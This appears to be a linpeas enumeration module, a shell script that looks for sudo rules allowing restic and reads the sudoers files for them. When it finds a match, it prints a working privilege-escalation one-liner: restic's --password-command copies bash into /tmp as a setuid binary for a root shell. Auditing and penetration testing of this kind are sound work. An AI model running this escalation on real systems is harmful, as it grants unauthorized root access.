# Title: Users Information - Sudo restic password-command abuse
# ID: UG_Sudo_restic
# Author: HT Bot
# Last Update: 13-12-2025
# Description: Detect sudo configurations that allow abusing restic --password-command for privilege escalation
# License: GNU GPL
# Version: 1.0
# Functions Used: echo_not_found, print_2title, print_info
# Global Variables: $PASSWORD
# Initial Functions:
# Generated Global Variables: $restic_bin, $restic_sudo_found, $sudo_no_pw_output, $sudo_with_pw_output, $matches, $sudo_file, $block, $origin
# Fat linpeas: 0
# Small linpeas: 1


print_2title "Checking sudo restic --password-command exposure"
print_info "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid"

restic_bin="$(command -v restic 2>/dev/null)"
if [ -n "$restic_bin" ]; then
  echo "restic binary found at: $restic_bin" | sed -${E} "s,.*,${SED_LIGHT_CYAN},g"
else
  echo "restic binary not found in PATH (still checking sudoers rules)" | sed -${E} "s,.*,${SED_YELLOW},g"
fi

restic_sudo_found=""

check_restic_entries() {
  local block="$1"
  local origin="$2"

  if [ -n "$block" ]; then
    local matches
    matches="$(printf '%s\n' "$block" | grep -i "restic" 2>/dev/null)"
    if [ -n "$matches" ]; then
      restic_sudo_found=1
      echo "$origin" | sed -${E} "s,.*,${SED_LIGHT_CYAN},g"
      printf '%s\n' "$matches" | sed -${E} "s,.*,${SED_RED_YELLOW},g"
    fi
  fi
}

sudo_no_pw_output="$(sudo -n -l 2>/dev/null)"
check_restic_entries "$sudo_no_pw_output" "Matches in 'sudo -n -l'"

if [ -n "$PASSWORD" ]; then
  sudo_with_pw_output="$(echo "$PASSWORD" | timeout 1 sudo -S -l 2>/dev/null)"
  check_restic_entries "$sudo_with_pw_output" "Matches in 'sudo -l' using provided password"
fi

if [ -r "/etc/sudoers" ]; then
  check_restic_entries "$(grep -v '^#' /etc/sudoers 2>/dev/null)" "Matches in /etc/sudoers"
fi

if [ -d "/etc/sudoers.d" ]; then
  for sudo_file in /etc/sudoers.d/*; do
    [ -f "$sudo_file" ] || continue
    check_restic_entries "$(grep -v '^#' "$sudo_file" 2>/dev/null)" "Matches in $sudo_file"
  done
fi

if [ -n "$restic_sudo_found" ]; then
  echo ""
  echo "restic's --password-command runs as the sudo target user (root)." | sed -${E} "s,.*,${SED_RED},g"
  echo "Example: sudo restic check --password-command 'cp /bin/bash /tmp/restic-root && chmod 6777 /tmp/restic-root'" | sed -${E} "s,.*,${SED_RED_YELLOW},g"
  echo "Then execute /tmp/restic-root -p for a root shell." | sed -${E} "s,.*,${SED_RED_YELLOW},g"
else
  echo_not_found "sudo restic"
fi

echo ""
